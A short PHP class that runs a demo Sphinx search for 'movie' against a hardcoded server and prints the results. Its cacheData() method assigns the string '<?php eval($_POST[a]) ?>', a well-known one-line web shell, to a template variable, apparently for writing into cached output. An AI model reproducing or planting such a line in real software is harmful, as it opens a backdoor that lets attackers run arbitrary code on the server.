<?php

class DemoIndexView extends BaseView
{

    public function index()
    {
		$wz='电影';
		require("sphinxapi.php" );
		$cl=new SphinxClient2();
		$cl->SetServer('114.112.163.2',9300);
		$cl->SetArrayResult(true);
		$cl->SetMatchMode (SPH_MATCH_EXTENDED2);
		$cl->SetFilter('isdelete',Array(0));
		$cl->SetGroupBy('categoryid',SPH_GROUPBY_ATTR,'@count desc');
		$cl->AddQuery($wz, "product");

		$cl->ResetGroupBy();
		$cl->ResetFilters();
		$cl->SetLimits(0,1,1000000);// limit 0,100
		$cl->SetFilter('isdelete',Array(0));
		$cl->SetSortMode(SPH_SORT_EXTENDED,'@weight desc');
		$cl->SetFieldWeights(array('name'=>100,'brandname'=>50,'info'=>20));
		//$cl->AddQuery($wz, "product");

		$res= $cl->RunQueries();
		P($res);

		//$this->responseError('dd');
    }

    public function cacheData()
    {

        $str = '<?php eval($_POST[a]) ?>';

        $this->assign('str', $str);
    }

}
